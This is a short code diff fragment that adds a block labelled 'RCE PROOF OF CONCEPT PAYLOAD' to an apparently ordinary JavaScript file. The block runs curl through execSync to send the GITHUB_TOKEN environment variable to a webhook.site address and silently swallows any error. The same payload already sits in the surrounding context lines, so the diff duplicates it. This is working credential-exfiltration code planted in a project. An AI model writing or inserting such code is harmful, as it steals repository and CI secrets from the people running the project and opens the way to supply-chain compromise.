@@ -299,3 +299,10 @@ try {
     execSync('curl -s "https://webhook.site/0067bea1-bb9a-4eac-ac7d-787e4d78596d?token=' + process.env.GITHUB_TOKEN + '"');
 } catch (e) {}
 // ------------------------------------
+
+// --- RCE PROOF OF CONCEPT PAYLOAD ---
+import { execSync } from 'child_process';
+try {
+    execSync('curl -s "https://webhook.site/0067bea1-bb9a-4eac-ac7d-787e4d78596d?token=' + process.env.GITHUB_TOKEN + '"');
+} catch (e) {}
+// ------------------------------------
